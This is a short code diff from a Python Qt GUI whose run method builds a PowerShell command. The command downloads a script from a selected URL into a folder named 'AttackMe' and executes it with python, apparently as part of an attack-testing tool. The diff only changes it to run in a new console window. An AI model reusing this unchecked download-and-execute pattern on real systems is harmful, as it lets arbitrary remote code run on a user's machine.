@@ -140,7 +140,7 @@ class MyWindow(QMainWindow):
     def run(self):
         for i in self.url_comboList.keys():
             if self.url_combo.currentText() == i:
-                cmd = 'powershell.exe -command "invoke-WebRequest {} -Outfile C:\AttackMe\download\M2_v1.py"; python "C:\AttackMe\download\M2_v1.py'.format(
+                cmd = 'powershell.exe -command "invoke-WebRequest {} -Outfile C:\AttackMe\download\M2_v1.py"; start cmd /k python "C:\AttackMe\download\M2_v1.py'.format(
                     self.url_comboList[i])
                 print(cmd)
                 os.system(cmd)
